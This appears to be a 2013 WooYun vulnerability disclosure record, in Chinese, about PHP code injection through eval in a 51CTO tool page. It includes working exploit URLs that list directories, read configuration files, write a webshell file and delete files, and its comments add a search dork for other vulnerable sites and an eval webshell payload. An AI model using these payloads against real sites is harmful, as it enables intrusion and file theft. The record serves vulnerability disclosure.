{"id": 7703, "wybug_id": "wooyun-2013-040647", "wybug_title": "51CTO技术网站存在php代码注入可webshell", "wybug_corp": "51CTO技术网站", "wybug_author": "秋风", "wybug_date": "2013-10-22 14:50", "wybug_open_date": "2013-12-06 14:51", "wybug_type": "命令执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["代码执行", "代码注入"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-10-22：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-10-22：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-11-01：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-11-11：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-11-21：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-12-06：\t细节向公众公开  简要描述： q:1#利用过程中发现引号无法使用，没关系，咱自行添加get参数，从全局变量$_GET中获取想要的一切。2#发现有大量响应此参数的代码，如想打印一个字符1,服务器代码缺陷造成1*N次触发，导致在利用过程中可能出现内存不足的情况，解决办法，在函数利用前加exit，使代码只运行一次！ 详细说明：  #1打印目录及文件，可修改参数d的值扫描整站\nhttp://tool.51cto.com/yb/yb.php?q=${@exit(print_r(scandir($_GET[d])))}&d=../../../\n>>服务器根目录文件打印结果Array(    [0] => .    [1] => ..    [2] => 51cto.com    [3] => hc3i.cn    [4] => px95site_t    [5] => suoyoo.com    [6] => suoyoo.com_2013-5-3    [7] => tools    [8] => watchstor.com)#2查看文件，可修改参数d的值查看整站文件\nhttp://tool.51cto.com/yb/yb.php?q=${@exit(print_r(file($_GET[d])))}&d=../../../51cto.com/tool/config.php\n#3写入传说中的webshell,参数d为内容,n为文件名利用：\nhttp://tool.51cto.com/yb/yb.php?q=${@exit(var_dump(file_put_contents($_GET[n],$_GET[d])))}&d=by:wooyun.org&n=./../wooyun.org.txt\n对应文件地址：\nhttp://tool.51cto.com/wooyun.org.txt\n#4删除文件，参数n为文件名\nhttp://tool.51cto.com/yb/yb.php?q=${@exit(var_dump(unlink($_GET[n])))}&n=./../wooyun.org.txt\n声明：测试所写入的文件本人已删除，建议扫描一下整站。目测#1的打印结果，危害还是比较大的，建议给20rank。   漏洞证明：  图1红线部分是打印出的文件和目录\n\n\n\n   修复方案：  1.有效过滤2.建议不要使用eval   版权声明：转载请注明来源 秋风@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2013-10-22 15:23 厂商回复： 感谢提交漏洞，我们尽快修复。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-10-22 14:52 |    \t\thacker@sina.cn \t\t\t( 普通白帽子  |\t\t\t        Rank:288 漏洞数:27        | ANONYMOUS)\t\t \n  关注一下    \n     2013-10-22 15:26 |    \t\tD＆G \t\t\t( 普通白帽子  |\t\t\t        Rank:523 漏洞数:103        | going)\t\t \n  牛！    \n     2013-10-22 16:52 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  NB    \n     2013-10-22 16:58 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  不知道这种洞主都是怎么发现的    \n     2013-10-23 09:16 |    \t\t秋风 \t\t\t( 普通白帽子  |\t\t\t        Rank:438 漏洞数:44        | 码农一枚，关注互联网安全)\t\t \n  我不会告诉你们，他这套程序是开源的（源码在github上），至于是否出自51cto之手，请自行校验！这段代码要么是程序员偷懒直接eval，要么尼玛就是个后门，要么压根就没意识到这个问题！用这套程序的站点，目测都存在这问题，适当的时候google一下，命中率极高！我没透露什么，对吧？@xsser    \n     2013-10-29 16:30 |    \t\tYu-brother \t\t\t( 路人 |\t\t\t        Rank:16 漏洞数:11        | 哥木有钱，木有房，木有车，木有媳妇，苦逼...)\t\t \n  ````````````````    \n     2013-11-21 16:25 |    \t\thacker@sina.cn \t\t\t( 普通白帽子  |\t\t\t        Rank:288 漏洞数:27        | ANONYMOUS)\t\t \n  果然霸气    \n     2013-12-06 15:14 |    \t\t小禾吉 \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | 宇宙的目的很可能和人类没有关系，宇宙很可...)\t\t \n  @秋风 求github地址    \n     2013-12-06 15:26 |    \t\t秋风 \t\t\t( 普通白帽子  |\t\t\t        Rank:438 漏洞数:44        | 码农一枚，关注互联网安全)\t\t \n  google hack如下：site:github.com web_admin_tools    \n     2013-12-06 15:30 |    \t\t巫妖 \t\t\t( 实习白帽子  |\t\t\t        Rank:38 漏洞数:5        | 腚大屁股圆，家里一定很有钱)\t\t \n  https://github.com/jiji262/web_admin_tools/blob/master/yb/yb.php    \n     2013-12-06 16:11 |    \t\t浩天  \t\t\t( 普通白帽子  |\t\t\t        Rank:915 漏洞数:79        | 度假中...)\t\t \n  @xsser 其实我也早就发现了，一会去提交个     \n     2013-12-07 09:57 |    \t\tHuc-Unis \t\t\t( 普通白帽子  |\t\t\t        Rank:1055 漏洞数:292        | 诶，现在通用奖励越来越低了；离买保时捷卡...)\t\t \n  @秋风 假如没有写入权限该怎么拿shell    \n     2013-12-20 16:27 |    \t\tYu-brother \t\t\t( 路人 |\t\t\t        Rank:16 漏洞数:11        | 哥木有钱，木有房，木有车，木有媳妇，苦逼...)\t\t \n  很有前途    \n     2014-01-27 19:13 |    \t\t伟哥 \t\t\t( 普通白帽子  |\t\t\t        Rank:110 漏洞数:29        | 不怕流氓有文化,就怕色狼有耐心,那么一只起...)\t\t \n  @Huc-Unis 你可以直接构造一个shell{${eval%28$_POST[c]%29}}    \n     2014-02-18 14:44 |    \t\twusuopubupt \t\t\t( 路人 |\t\t\t        Rank:3 漏洞数:2        | BUPTer, linux lover.)\t\t \n  厉害！    \n     2014-06-13 22:54 |    \t\tYu-brother \t\t\t( 路人 |\t\t\t        Rank:16 漏洞数:11        | 哥木有钱，木有房，木有车，木有媳妇，苦逼...)\t\t \n  ok    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}